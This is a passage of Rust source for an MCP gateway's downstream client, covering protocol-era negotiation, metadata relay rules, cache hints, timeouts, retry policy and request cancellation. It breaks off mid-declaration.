//! Downstream MCP client.
//!
//! The gateway is an MCP *server* to the AI client, and an MCP *client* to each
//! real server behind it. This module is that client half: it speaks JSON-RPC to
//! one downstream server over a transport, does the handshake, and lists/calls
//! its tools. The transport is abstracted so the router can be tested with a mock
//! instead of spawning real processes.

use std::collections::{HashMap, HashSet};
use std::io::{BufRead, BufReader, Read, Write};
use std::path::Path;
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicU8, Ordering};
use std::sync::mpsc::{Receiver, RecvTimeoutError, Sender};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use base64::Engine as _;

/// Called from a downstream stdout drain when an armed server emits
/// `notifications/resources/updated` (SOU-394). The gateway fans the URI out to
/// subscribed upstream clients only.
pub type ResourceUpdatedSink = Arc<dyn Fn(String) + Send + Sync>;

/// Called from a downstream drain when a server emits `notifications/progress`
/// (SOU-444 part 2). Carries the whole notification, because routing it is the
/// gateway's job: only the gateway knows which upstream client minted the
/// `progressToken` it relayed on this server's behalf.
pub type ProgressSink = Arc<dyn Fn(Value) + Send + Sync>;

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct SubscriptionFilter {
    pub tools_list_changed: bool,
    pub prompts_list_changed: bool,
    pub resources_list_changed: bool,
    pub resource_subscriptions: Vec<String>,
}

impl SubscriptionFilter {
    fn params(&self) -> Value {
        let mut notifications = serde_json::Map::new();
        if self.tools_list_changed {
            notifications.insert("toolsListChanged".to_string(), Value::Bool(true));
        }
        if self.prompts_list_changed {
            notifications.insert("promptsListChanged".to_string(), Value::Bool(true));
        }
        if self.resources_list_changed {
            notifications.insert("resourcesListChanged".to_string(), Value::Bool(true));
        }
        if !self.resource_subscriptions.is_empty() {
            notifications.insert(
                "resourceSubscriptions".to_string(),
                json!(&self.resource_subscriptions),
            );
        }
        json!({ "notifications": notifications })
    }
}

use serde_json::{json, Value};

#[derive(Clone, Debug, PartialEq, Eq)]
struct HeaderParamSpec {
    header_name: String,
    path: Vec<String>,
}

fn is_http_token(value: &str) -> bool {
    !value.is_empty()
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric()
                || matches!(
                    byte,
                    b'!' | b'#' | b'$' | b'%' | b'&' | b'\'' | b'*' | b'+' | b'-'
                        | b'.' | b'^' | b'_' | b'`' | b'|' | b'~'
                )
        })
}

/// Encode a modern MCP routing/header value using the SEP-2243 sentinel form.
#[doc(hidden)]
pub fn encode_mcp_header_text(value: &str) -> String {
    let safe_ascii = value
        .bytes()
        .all(|byte| matches!(byte, 0x20..=0x7e))
        && value.trim() == value
        && !(value.starts_with("=?base64?") && value.ends_with("?="));
    if safe_ascii {
        value.to_string()
    } else {
        format!(
            "=?base64?{}?=",
            base64::engine::general_purpose::STANDARD.encode(value.as_bytes())
        )
    }
}

fn modern_standard_headers(body: &Value) -> Result<Vec<(String, String)>, TransportError> {
    let Some(method) = body.get("method").and_then(Value::as_str) else {
        return Ok(Vec::new());
    };
    let mut headers = vec![(
        "Mcp-Method".to_string(),
        encode_mcp_header_text(method),
    )];
    let name = match method {
        "tools/call" | "prompts/get" => body
            .get("params")
            .and_then(|params| params.get("name"))
            .and_then(Value::as_str),
        "resources/read" => body
            .get("params")
            .and_then(|params| params.get("uri"))
            .and_then(Value::as_str),
        "tasks/get" | "tasks/update" | "tasks/cancel" => body
            .get("params")
            .and_then(|params| params.get("taskId"))
            .and_then(Value::as_str),
        _ => None,
    };
    if matches!(
        method,
        "tools/call"
            | "prompts/get"
            | "resources/read"
            | "tasks/get"
            | "tasks/update"
            | "tasks/cancel"
    ) && name.is_none()
    {
        return Err(TransportError::Fatal(format!(
            "modern HTTP request '{method}' is missing its routing name"
        )));
    }
    if let Some(name) = name {
        headers.push(("Mcp-Name".to_string(), encode_mcp_header_text(name)));
    }
    Ok(headers)
}

fn contains_x_mcp_header(value: &Value) -> bool {
    match value {
        Value::Object(object) => {
            object.contains_key("x-mcp-header") || object.values().any(contains_x_mcp_header)
        }
        Value::Array(values) => values.iter().any(contains_x_mcp_header),
        _ => false,
    }
}

fn collect_header_param_specs(
    schema: &Value,
    path: &mut Vec<String>,
    names: &mut HashSet<String>,
    specs: &mut Vec<HeaderParamSpec>,
) -> Result<(), String> {
    let Some(object) = schema.as_object() else {
        return Ok(());
    };
    if let Some(annotation) = object.get("x-mcp-header") {
        let name = annotation
            .as_str()
            .ok_or_else(|| "x-mcp-header must be a string".to_string())?;
        if path.is_empty() {
            return Err("x-mcp-header must annotate an input property".to_string());
        }
        if !is_http_token(name) {
            return Err(format!("x-mcp-header '{name}' is not a valid HTTP token"));
        }
        let property_type = object.get("type").and_then(Value::as_str).unwrap_or("");
        if !matches!(property_type, "string" | "integer" | "boolean") {
            return Err(format!(
                "x-mcp-header '{name}' must annotate string, integer, or boolean"
            ));
        }
        if !names.insert(name.to_ascii_lowercase()) {
            return Err(format!("x-mcp-header '{name}' is not case-insensitively unique"));
        }
        specs.push(HeaderParamSpec {
            header_name: format!("Mcp-Param-{name}"),
            path: path.clone(),
        });
    }

    for (key, value) in object {
        if key != "properties" && key != "x-mcp-header" && contains_x_mcp_header(value) {
            return Err(format!(
                "x-mcp-header is not statically reachable through properties (found under '{key}')"
            ));
        }
    }
    if let Some(properties) = object.get("properties").and_then(Value::as_object) {
        for (property, child) in properties {
            path.push(property.clone());
            collect_header_param_specs(child, path, names, specs)?;
            path.pop();
        }
    }
    Ok(())
}

fn header_param_specs(tool: &Value) -> Result<Vec<HeaderParamSpec>, String> {
    let Some(schema) = tool.get("inputSchema") else {
        return Ok(Vec::new());
    };
    let mut specs = Vec::new();
    collect_header_param_specs(
        schema,
        &mut Vec::new(),
        &mut HashSet::new(),
        &mut specs,
    )?;
    Ok(specs)
}

fn filter_modern_http_tools(server_id: &str, tools: Vec<Value>) -> Vec<Value> {
    tools
        .into_iter()
        .filter(|tool| match header_param_specs(tool) {
            Ok(_) => true,
            Err(reason) => {
                let name = tool.get("name").and_then(Value::as_str).unwrap_or("<unnamed>");
                eprintln!(
                    "toolport: excluding tool '{server_id}__{name}' from a modern HTTP catalog: {reason}"
                );
                false
            }
        })
        .collect()
}

fn value_at_path<'a>(value: &'a Value, path: &[String]) -> Option<&'a Value> {
    path.iter().try_fold(value, |current, part| current.get(part))
}

fn encode_header_param(value: &Value) -> Result<Option<String>, TransportError> {
    const MAX_SAFE_INTEGER: i64 = 9_007_199_254_740_991;
    match value {
        Value::Null => Ok(None),
        Value::String(value) => Ok(Some(encode_mcp_header_text(value))),
        Value::Bool(value) => Ok(Some(value.to_string())),
        Value::Number(value) => {
            let integer = value.as_i64().ok_or_else(|| {
                TransportError::Fatal("x-mcp-header value must be an integer".to_string())
            })?;
            if !(-MAX_SAFE_INTEGER..=MAX_SAFE_INTEGER).contains(&integer) {
                return Err(TransportError::Fatal(
                    "x-mcp-header integer exceeds the JavaScript safe range".to_string(),
                ));
            }
            Ok(Some(integer.to_string()))
        }
        _ => Err(TransportError::Fatal(
            "x-mcp-header value must be string, integer, boolean, or null".to_string(),
        )),
    }
}

fn tool_request_headers(
    tools: &[Value],
    tool_name: &str,
    arguments: &Value,
) -> Result<Vec<(String, String)>, TransportError> {
    let Some(tool) = tools
        .iter()
        .find(|tool| tool.get("name").and_then(Value::as_str) == Some(tool_name))
    else {
        return Ok(Vec::new());
    };
    let specs = header_param_specs(tool).map_err(TransportError::Fatal)?;
    let mut headers = Vec::new();
    for spec in specs {
        if let Some(value) = value_at_path(arguments, &spec.path) {
            if let Some(encoded) = encode_header_param(value)? {
                headers.push((spec.header_name, encoded));
            }
        }
    }
    headers.sort_by(|left, right| left.0.cmp(&right.0));
    Ok(headers)
}

pub const PROTOCOL_VERSION: &str = "2025-06-18";

/// Which protocol era a downstream connection settled on (SOU-445).
///
/// Replaces the single global [`PROTOCOL_VERSION`] for anything that needs to
/// know how to talk to a *particular* server: Toolport can hold connections in
/// both eras at once, and must translate between them when the upstream client's
/// era differs from a downstream server's.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Era {
    /// Opened with an `initialize` handshake; the version was negotiated once for
    /// the whole connection (2025-11-25 and earlier).
    Legacy { version: String },
    /// No handshake: version, identity, and capabilities ride on every request's
    /// `_meta` (2026-07-28 and later).
    Modern { version: String },
}

impl Era {
    pub fn version(&self) -> &str {
        match self {
            Era::Legacy { version } | Era::Modern { version } => version,
        }
    }

    pub fn is_modern(&self) -> bool {
        matches!(self, Era::Modern { .. })
    }
}

/// Pick a protocol version from a `DiscoverResult`, preferring the newest
/// revision Toolport implements.
fn choose_protocol_version(discovered: &Value) -> Option<String> {
    let supported: Vec<&str> = discovered
        .get("supportedVersions")
        .and_then(Value::as_array)?
        .iter()
        .filter_map(Value::as_str)
        .collect();
    supported
        .iter()
        .find(|v| **v == MODERN_PROTOCOL_VERSION)
        .map(|v| (*v).to_string())
}

/// Every MCP revision Toolport can speak to a downstream server, newest first.
///
/// `2026-07-28` and later are "modern": no handshake, with version, identity and
/// capabilities carried as per-request `_meta`. Everything earlier is "legacy"
/// and opens with `initialize`. Toolport is dual-era, so it must drive both.
pub const MODERN_PROTOCOL_VERSION: &str = "2026-07-28";

/// Conservative cache policy for one cacheable MCP result (SOU-454).
///
/// `expires_at` is absolute rather than a stored TTL so Toolport never resets a
/// downstream server's freshness clock each time an upstream client asks for the
/// aggregated result. `refresh_after` normally matches it; after a failed refresh
/// it moves forward briefly to avoid retrying on every one-second watcher tick
/// while the advertised remaining TTL correctly stays at zero.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct CacheHint {
    expires_at: Option<Instant>,
    refresh_after: Option<Instant>,
    public: bool,
}

impl Default for CacheHint {
    fn default() -> Self {
        Self {
            expires_at: None,
            refresh_after: None,
            public: false,
        }
    }
}

impl CacheHint {
    pub fn from_result(result: &Value) -> Self {
        let ttl_ms = result.get("ttlMs").and_then(Value::as_u64).unwrap_or(0);
        let now = Instant::now();
        let expires_at = (ttl_ms > 0)
            .then(|| Duration::from_millis(ttl_ms))
            .and_then(|ttl| now.checked_add(ttl));
        Self {
            expires_at,
            refresh_after: expires_at,
            // Unknown, missing, or malformed values fail closed to private.
            public: result.get("cacheScope").and_then(Value::as_str) == Some("public"),
        }
    }

    pub fn local(ttl_ms: u64) -> Self {
        let now = Instant::now();
        let expires_at = (ttl_ms > 0)
            .then(|| Duration::from_millis(ttl_ms))
            .and_then(|ttl| now.checked_add(ttl));
        Self {
            expires_at,
            refresh_after: expires_at,
            public: true,
        }
    }

    /// Most-conservative combination for an aggregated or paginated result.
    pub fn merge(self, other: Self) -> Self {
        let expires_at = match (self.expires_at, other.expires_at) {
            (Some(left), Some(right)) => Some(left.min(right)),
            _ => None,
        };
        let refresh_after = match (self.refresh_after, other.refresh_after) {
            (Some(left), Some(right)) => Some(left.min(right)),
            _ => None,
        };
        Self {
            expires_at,
            refresh_after,
            public: self.public && other.public,
        }
    }

    pub fn remaining_ttl_ms(&self) -> u64 {
        self.expires_at
            .and_then(|expires| expires.checked_duration_since(Instant::now()))
            .map(|remaining| remaining.as_millis().min(u128::from(u64::MAX)) as u64)
            .unwrap_or(0)
    }

    pub fn is_public(&self) -> bool {
        self.public
    }

    /// Only positive TTLs schedule polling. A zero/missing TTL means immediately
    /// stale, but the protocol does not require clients to hammer the server; the
    /// existing list-changed notification path remains the invalidation mechanism.
    pub fn needs_refresh(&self) -> bool {
        self.refresh_after.is_some_and(|at| Instant::now() >= at)
    }

    fn mark_stale_and_defer(&mut self) {
        self.expires_at = None;
        self.refresh_after = Some(Instant::now() + Duration::from_secs(30));
    }
}

/// Consecutive successful empty list responses required before we accept a wipe
/// of a previously non-empty catalog (SOU-338).
///
/// **Decision (CodeRev on #629):** a single empty success is treated as a
/// transient glitch / list_changed race and is not applied. Two consecutive
/// empty successes are treated as intentional (admin revoked tools, server
/// emptied the catalog) and the wipe is accepted. A full router rebuild still
/// replaces catalogs from a fresh connect regardless of this counter.
const EMPTY_CATALOG_CONFIRMATIONS: u8 = 2;

/// Apply a successful list refresh with SOU-338 empty-success handling.
///
/// - Non-empty `new_items` always replaces and clears the empty streak.
/// - Empty `new_items` when `previous` is already empty is a no-op replace.
/// - Empty `new_items` when `previous` is non-empty increments `empty_streak`;
///   only at [`EMPTY_CATALOG_CONFIRMATIONS`] is the wipe accepted.
fn apply_catalog_refresh(
    previous: &mut Vec<Value>,
    new_items: Vec<Value>,
    empty_streak: &mut u8,
    cache_hint: &mut CacheHint,
    new_hint: CacheHint,
    server_id: &str,
    kind: &str,
) {
    if !previous.is_empty() && new_items.is_empty() {
        *empty_streak = empty_streak.saturating_add(1);
        if *empty_streak < EMPTY_CATALOG_CONFIRMATIONS {
            cache_hint.mark_stale_and_defer();
            eprintln!(
                "toolport: keeping server '{server_id}' previous {kind} catalog after a successful empty refresh ({empty_streak}/{EMPTY_CATALOG_CONFIRMATIONS})"
            );
            return;
        }
        eprintln!(
            "toolport: accepting empty {kind} catalog for server '{server_id}' after {EMPTY_CATALOG_CONFIRMATIONS} consecutive empty refreshes"
        );
        *empty_streak = 0;
        *cache_hint = new_hint;
        *previous = new_items;
        return;
    }
    *empty_streak = 0;
    *cache_hint = new_hint;
    *previous = new_items;
}

/// Error codes the 2026-07-28 allocation policy reserves for the specification
/// (`-32020`..`-32099`). Their presence in a response is what identifies a modern
/// server during the backward-compatibility probe.
pub const HEADER_MISMATCH: i64 = -32020;
pub const MISSING_REQUIRED_CLIENT_CAPABILITY: i64 = -32021;
pub const UNSUPPORTED_PROTOCOL_VERSION: i64 = -32022;

/// `_meta` keys that describe a single client-to-server hop and therefore must
/// NOT be relayed onward (SOU-444).
///
/// Toolport is the *client* on the downstream hop, so it speaks for itself
/// there: the version it negotiated with that particular server, its own
/// identity, and the capabilities it can actually service. Relaying the upstream
/// client's values would assert claims Toolport cannot honour - advertising a
/// sampling capability, say, that the gateway would then have to service on the
/// client's behalf. SOU-445/SOU-446 replace these with Toolport's own per-
/// connection values rather than simply omitting them.
pub const PER_HOP_META_KEYS: [&str; 3] = [
    "io.modelcontextprotocol/protocolVersion",
    "io.modelcontextprotocol/clientInfo",
    "io.modelcontextprotocol/clientCapabilities",
];

/// Keys relayed only once Toolport can honour what they ask for.
///
/// `progressToken` lived here until the gateway learned to route
/// `notifications/progress` back to the client that minted it (SOU-444 part 2);
/// relaying a token whose notifications we then dropped would have invited that
/// traffic into a black hole. Empty today, kept because the next revision brings
/// more keys with the same "relay only when we can service it" shape.
const WITHHELD_META_KEYS: [&str; 0] = [];

/// The part of an upstream client's `_meta` that may travel downstream.
///
/// MCP's `_meta` is an open map: OpenTelemetry trace context, extension
/// namespaces, and (from 2026-07-28) protocol version, client identity, and
/// capabilities all ride here. Everything that is not per-hop or explicitly
/// withheld is relayed untouched, including keys this build has never heard of -
/// that is what keeps Toolport from silently breaking future extensions.
///
/// Returns `None` when nothing survives, so the outgoing params keep their
/// historical shape byte-for-byte.
pub fn relayable_meta(meta: Option<&Value>) -> Option<Value> {
    let obj = meta?.as_object()?;
    let kept: serde_json::Map<String, Value> = obj
        .iter()
        .filter(|(k, _)| {
            !PER_HOP_META_KEYS.contains(&k.as_str()) && !WITHHELD_META_KEYS.contains(&k.as_str())
        })
        .map(|(k, v)| (k.clone(), v.clone()))
        .collect();
    (!kept.is_empty()).then(|| Value::Object(kept))
}

/// Apply the same per-hop discipline to a params object that is forwarded
/// wholesale rather than rebuilt.
///
/// `completion/complete` is the one request Toolport already relayed verbatim
/// (`Router::resolve_completion` clones the client's params and rewrites only
/// `ref`), so without this it would leak per-hop keys the rebuilt paths strip.
pub fn sanitize_forwarded_meta(params: &mut Value) {
    let Some(obj) = params.as_object_mut() else {
        return;
    };
    if !obj.contains_key("_meta") {
        return;
    }
    match relayable_meta(obj.get("_meta")) {
        Some(kept) => obj.insert("_meta".to_string(), kept),
        None => obj.remove("_meta"),
    };
}

/// Attach relayed `_meta` to an outgoing params object.
///
/// A request carrying no relayable metadata is left exactly as Toolport built it
/// before SOU-444, so existing downstream servers see no change whatsoever.
fn with_meta(mut params: Value, meta: Option<&Value>) -> Value {
    if let Some(relayed) = relayable_meta(meta) {
        params["_meta"] = relayed;
    }
    params
}

/// Copy only extension declarations from the upstream client's per-request
/// capabilities onto a modern downstream hop.
///
/// Core client capabilities remain per-hop: Toolport may only advertise roots,
/// sampling, or elicitation when it can service those callbacks itself. Unknown
/// extension declarations are different. Their negotiation and payloads are
/// intentionally opaque to a transparent gateway, so preserving the settings
/// object is the only future-compatible behavior (SOU-453).
fn attach_client_extensions(params: &mut Value, meta: Option<&Value>) {
    let Some(extensions) = meta
        .and_then(|meta| meta.get("io.modelcontextprotocol/clientCapabilities"))
        .and_then(|capabilities| capabilities.get("extensions"))
        .and_then(Value::as_object)
        .filter(|extensions| !extensions.is_empty())
        .cloned()
    else {
        return;
    };
    let Some(params) = params.as_object_mut() else {
        return;
    };
    let meta = params
        .entry("_meta")
        .or_insert_with(|| Value::Object(serde_json::Map::new()));
    if !meta.is_object() {
        *meta = Value::Object(serde_json::Map::new());
    }
    meta["io.modelcontextprotocol/clientCapabilities"] = json!({
        "extensions": Value::Object(extensions)
    });
}

/// Wire-only fields used when a 2026-07-28 client retries an incomplete request.
///
/// They are intentionally kept separate from tool arguments and `_meta`: all three
/// live at different levels in MCP params, and collapsing them would either expose
/// protocol bookkeeping to a tool or drop it at the gateway boundary (SOU-449).
#[derive(Clone, Debug, Default, PartialEq)]
pub struct MrtrRequest {
    pub input_responses: Option<Value>,
    pub request_state: Option<Value>,
}

impl MrtrRequest {
    pub fn from_params(params: Option<&Value>) -> Self {
        Self {
            input_responses: params
                .and_then(|p| p.get("inputResponses"))
                .filter(|value| !value.is_null())
                .cloned(),
            request_state: params
                .and_then(|p| p.get("requestState"))
                .filter(|value| !value.is_null())
                .cloned(),
        }
    }

    pub fn is_empty(&self) -> bool {
        self.input_responses.is_none() && self.request_state.is_none()
    }

    fn apply(&self, params: &mut Value) {
        let Some(obj) = params.as_object_mut() else {
            return;
        };
        if let Some(responses) = &self.input_responses {
            obj.insert("inputResponses".to_string(), responses.clone());
        }
        if let Some(state) = &self.request_state {
            obj.insert("requestState".to_string(), state.clone());
        }
    }
}

fn with_meta_and_mrtr(
    params: Value,
    meta: Option<&Value>,
    mrtr: Option<&MrtrRequest>,
) -> Value {
    let mut params = with_meta(params, meta);
    if let Some(mrtr) = mrtr {
        mrtr.apply(&mut params);
    }
    params
}

fn upstream_is_modern(meta: Option<&Value>) -> bool {
    meta.and_then(|m| m.get("io.modelcontextprotocol/protocolVersion"))
        .and_then(Value::as_str)
        == Some(MODERN_PROTOCOL_VERSION)
}

/// Merge the connection's standard protocol `_meta` into an outgoing request.
///
/// Applied by the transport, so every request gets it regardless of which call
/// site built the params. Protocol keys win over anything already present:
/// they describe *this* hop, and Toolport owns them (SOU-445).
fn merge_protocol_meta(params: &mut Value, protocol: &Value) {
    let (Some(obj), Some(protocol)) = (params.as_object_mut(), protocol.as_object()) else {
        return;
    };
    let slot = obj
        .entry("_meta")
        .or_insert_with(|| Value::Object(serde_json::Map::new()));
    if !slot.is_object() {
        *slot = Value::Object(serde_json::Map::new());
    }
    if let Some(meta) = slot.as_object_mut() {
        for (key, value) in protocol {
            // `clientCapabilities` is still owned by this hop, but extension
            // negotiation is the one intentionally transparent part. The
            // request builder copied only the upstream extension map here; keep
            // it while replacing every core capability with Toolport's own.
            let mut value = value.clone();
            if key == "io.modelcontextprotocol/clientCapabilities" {
                if let Some(extensions) = meta
                    .get(key)
                    .and_then(|capabilities| capabilities.get("extensions"))
                    .and_then(Value::as_object)
                    .filter(|extensions| !extensions.is_empty())
                    .cloned()
                {
                    value["extensions"] = Value::Object(extensions);
                }
            }
            meta.insert(key.clone(), value);
        }
    }
}

/// The standard `_meta` a modern (2026-07-28+) connection puts on every request.
fn protocol_meta_for(version: &str) -> Value {
    json!({
        "io.modelcontextprotocol/protocolVersion": version,
        "io.modelcontextprotocol/clientInfo": {
            "name": "toolport-gateway",
            "version": env!("CARGO_PKG_VERSION")
        },
        // Toolport speaks for itself on this hop. It advertises no client
        // capabilities of its own yet; SOU-449 fills these in once MRTR lets the
        // gateway service sampling/elicitation on a client's behalf.
        "io.modelcontextprotocol/clientCapabilities": {}
    })
}

/// Extension identifier for the headless OAuth flow (SBS-524).
pub const OAUTH_CLIENT_CREDENTIALS_EXTENSION: &str =
    "io.modelcontextprotocol/oauth-client-credentials";

/// Merge Toolport's own extension declarations into a per-request `_meta`.
///
/// Kept separate from `protocol_meta` because [`Transport::set_protocol_meta`]
/// replaces that wholesale after version negotiation, which would otherwise
/// silently drop a declaration made at connect time. Re-merging on every set is
/// what makes the declaration survive.
fn merge_declared_extensions(meta: &mut Value, declared: &serde_json::Map<String, Value>) {
    if declared.is_empty() {
        return;
    }
    let Some(obj) = meta.as_object_mut() else {
        return;
    };
    let capabilities = obj
        .entry("io.modelcontextprotocol/clientCapabilities")
        .or_insert_with(|| json!({}));
    let Some(capabilities) = capabilities.as_object_mut() else {
        return;
    };
    let extensions = capabilities
        .entry("extensions")
        .or_insert_with(|| json!({}));
    let Some(extensions) = extensions.as_object_mut() else {
        return;
    };
    for (name, settings) in declared {
        extensions.insert(name.clone(), settings.clone());
    }
}

const MCP_APPS_EXTENSION: &str = "io.modelcontextprotocol/ui";
const MCP_APP_HTML_MIME: &str = "text/html;profile=mcp-app";

/// Metadata used for Toolport's own modern catalog fetches.
///
/// MCP Apps servers may expose their UI linkage only after the client declares
/// support. Toolport can faithfully relay that linkage and the reserved HTML
/// resource to a capable upstream host, so it truthfully declares the one MIME
/// type it supports here. Other extensions stay request-driven: claiming them
/// without an originating client could invite callbacks or semantics the
/// gateway cannot service.
fn protocol_meta_for_catalog(version: &str, server_capabilities: Option<&Value>) -> Value {
    let mut meta = protocol_meta_for(version);
    let supports_mcp_apps = server_capabilities
        .and_then(|capabilities| capabilities.get("extensions"))
        .and_then(|extensions| extensions.get(MCP_APPS_EXTENSION))
        .and_then(|settings| settings.get("mimeTypes"))
        .and_then(Value::as_array)
        .is_some_and(|mime_types| mime_types.iter().any(|mime| mime == MCP_APP_HTML_MIME));
    if supports_mcp_apps {
        meta["io.modelcontextprotocol/clientCapabilities"] = json!({
            "extensions": {
                (MCP_APPS_EXTENSION): {
                    "mimeTypes": [MCP_APP_HTML_MIME]
                }
            }
        });
    }
    meta
}

/// Max time to wait for a single stdio response before giving up. Without this a
/// server that never replies would block its thread (and the batch health probe)
/// forever.
const STDIO_READ_TIMEOUT: Duration = Duration::from_secs(30);
/// Tighter bound for the connect handshake (initialize + tools/list). The batch
/// probe and every router rebuild connect to all servers and wait on the slowest,
/// so one hung server should fail in seconds, not stall everything for the full
/// live-call timeout. Restored to STDIO_READ_TIMEOUT once connected.
const STDIO_CONNECT_TIMEOUT: Duration = Duration::from_secs(10);
/// Budget for the `server/discover` era probe, deliberately far tighter than any
/// connect timeout.
///
/// The probe only runs after a server has already answered `initialize` with an
/// error, so the process is alive and responsive; a server that implements
/// `server/discover` answers it locally and immediately. A legacy server that
/// does not implement it usually stays silent, and that silence is the signal to
/// fall back. Charging the full connect budget for that silence would make every
/// legacy misconfiguration take minutes to report.
const PROBE_TIMEOUT: Duration = Duration::from_millis(750);
/// First-`initialize` budget for download-then-run launchers (npx, uvx, pnpm dlx,
/// ...). On a cold cache these resolve and download the server package before the
/// process can answer anything - easily 15-60s, far past the normal handshake
/// budget - so the tight timeout misreports a healthy-but-installing server as
/// broken (it then works on the next refresh, once the cache is warm). Being
/// alive-but-quiet is expected during the download; a child that actually dies
/// still fails immediately because its stdout closing ends the wait. Batch
/// connects run one thread per server, so several cold launchers install in
/// parallel and a batch waits out this budget at most once, not per server.
const LAUNCHER_CONNECT_TIMEOUT: Duration = LEADER_OPEN_BUDGET;

/// The longest a single legitimate downstream open can take: the launcher budget
/// above, which is the slowest path (it exceeds the ~110s of three
/// [`STDIO_READ_TIMEOUT`] attempts plus backoff). Exported so anything that waits on
/// another caller's open - `OPEN_GATE_WAIT` in the gateway - derives its deadline from
/// this instead of hardcoding a number the two can drift apart on (SOU-434).
pub const LEADER_OPEN_BUDGET: Duration = Duration::from_secs(120);
/// Keep at most this many bytes of a child's stderr tail for error reporting.
const STDERR_TAIL_CAP: usize = 4096;

/// Cap on how much of a downstream HTTP/SSE response body we buffer, so a malicious
/// or broken server can't stream gigabytes to exhaust gateway memory. Generous: real
/// MCP responses are tiny.
const MAX_RESPONSE_BYTES: u64 = 16 * 1024 * 1024;
/// Bound paginated MCP catalog traversal so a malicious server cannot keep the
/// gateway in an infinite cursor chain or grow its in-memory catalog without limit.
const MAX_LIST_PAGES: usize = 1_000;
const MAX_LIST_ITEMS: usize = 100_000;
const MAX_LIST_DURATION: Duration = Duration::from_secs(30);

/// Retry budget for transient HTTP failures that are SAFE to repeat: a connection
/// that never reached the server, or an explicit 429 rate-limit. We deliberately
/// do NOT retry 5xx or post-send I/O errors, because an MCP `tools/call` is not
/// guaranteed idempotent and may already have executed server-side, so a blind
/// retry could double-execute it (send the email twice, charge the card twice).
pub(crate) const HTTP_MAX_RETRIES: u32 = 2;
/// Base backoff between retries; doubles each attempt, capped at HTTP_RETRY_CAP.
pub(crate) const HTTP_RETRY_BASE: Duration = Duration::from_millis(250);
pub(crate) const HTTP_RETRY_CAP: Duration = Duration::from_secs(10);


/// Error from a single transport request attempt. The caller (Router) owns the
/// retry loop so it can release the per-server Mutex during the backoff sleep,
/// instead of blocking every other agent queued on the same server.
#[derive(Debug, Clone)]
pub enum TransportError {
    /// Non-retryable protocol/application error: the request reached the server and it
    /// responded with an error (or the response was structurally invalid). Does NOT
    /// count against server health - a bad tool call is not a dead server.
    Fatal(String),
    /// The server returned a JSON-RPC *error object*, preserved structurally.
    ///
    /// Previously these were flattened with `Fatal(err.to_string())`, which threw
    /// away the `code`. The 2026-07-28 era probe branches on exactly that code, so
    /// it has to survive (SOU-445). Treated like `Fatal` everywhere else: an error
    /// response is not a health failure.
    Rpc(Value),
    /// The server is unreachable or unresponsive (a read timed out, or the connection
    /// died). Distinct from `Fatal` so the circuit breaker can trip on a genuinely
    /// dead/hung server without counting ordinary error responses against it.
    Unavailable(String),
    /// Retryable: a 429 rate-limit or a connection that never reached the server.
    /// `retry_after` carries the server-advertised delay (Retry-After) if present;
    /// the caller falls back to its own exponential backoff when `None`.
    Retry {
        retry_after: Option<Duration>,
        message: String,
    },
}

/// Tracks client-side JSON-RPC request ids that are currently proxied to a
/// downstream stdio server. A later `notifications/cancelled` from the client can
/// forward cancellation to the downstream server's own request id.
#[derive(Clone, Default)]
pub struct CancelRegistry {
    inner: Arc<Mutex<CancelState>>,
}

#[derive(Default)]
struct CancelState {
    active: HashSet<String>,
    cancelled: HashMap<String, CancelledRequest>,
    in_flight: HashMap<String, CancelEntry>,
}

#[derive(Clone, Default)]
struct CancelledRequest {
    reason: Option<String>,
    forwarded: bool,
}

#[derive(Clone)]
struct CancelEntry {
    stdin: Arc<Mutex<ChildStdin>>,
    downstream_id: Value,
}

/// Cancellation context for one proxied client request.
#[derive(Clone)]
pub struct CancelContext {
    client_request_id: String,
    registry: CancelRegistry,
}

struct CancelGuard {
    client_request_id: String,
    registry: CancelRegistry,
}

impl CancelRegistry {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn begin_client_request(&self, client_request_id: String) -> bool {
        let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
        if state.active.contains(&client_request_id) {
            return false;
        }
        state.active.insert(client_request_id);
        true
    }

    pub fn finish_client_request(&self, client_request_id: &str) {
        let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
        state.active.remove(client_request_id);
        state.cancelled.remove(client_request_id);
        state.in_flight.remove(client_request_id);
    }

    pub fn context(&self, client_request_id: String) -> CancelContext {
        CancelContext { client_request_id, registry: self.clone() }
    }

    /// Mark an active client request as cancelled and, if it has already reached a
    /// stdio downstream, forward `notifications/cancelled` with that downstream id.
    /// Returns true when the referenced client request is still active.
    pub fn cancel(&self, client_request_id: &str, reason: Option<&str>) -> bool {
        let forward = {
            let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
            if !state.active.contains(client_request_id) {
                return false;
            }
            let reason = normalize_cancel_reason(reason);
            let cancelled = state
                .cancelled
                .entry(client_request_id.to_string())
                .or_default();
            if reason.is_some() {
                cancelled.reason = reason;
            }
            prepare_cancel_forward(&mut state, client_request_id)
        };
        if let Some((entry, reason)) = forward {
            entry.send_cancel_async(reason);
        }
        true
    }

    pub fn is_cancelled(&self, client_request_id: &str) -> bool {
        self.inner
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .cancelled
            .contains_key(client_request_id)
    }

    fn forward_cancel_if_ready(&self, client_request_id: &str) {
        let forward = {
            let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
            prepare_cancel_forward(&mut state, client_request_id)
        };
        if let Some((entry, reason)) = forward {
            entry.send_cancel_async(reason);
        }
    }

    fn register(&self, client_request_id: String, entry: CancelEntry) -> CancelGuard {
        let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
        state.in_flight.insert(client_request_id.clone(), entry);
        if let Some(cancelled) = state.cancelled.get_mut(&client_request_id) {
            cancelled.forwarded = false;
        }
        CancelGuard { client_request_id, registry: self.clone() }
    }
}

/// Cap on concurrently-forwarding cancellation threads. The forward is a best-effort
/// `writeln!` to the child's stdin, which blocks if the child isn't draining its pipe.
/// Without a cap, repeated cancellation of a wedged downstream would leak one blocked
/// thread per cancel; past the cap we drop the notification instead.
static CANCEL_THREADS_INFLIGHT: std::sync::atomic::AtomicUsize =
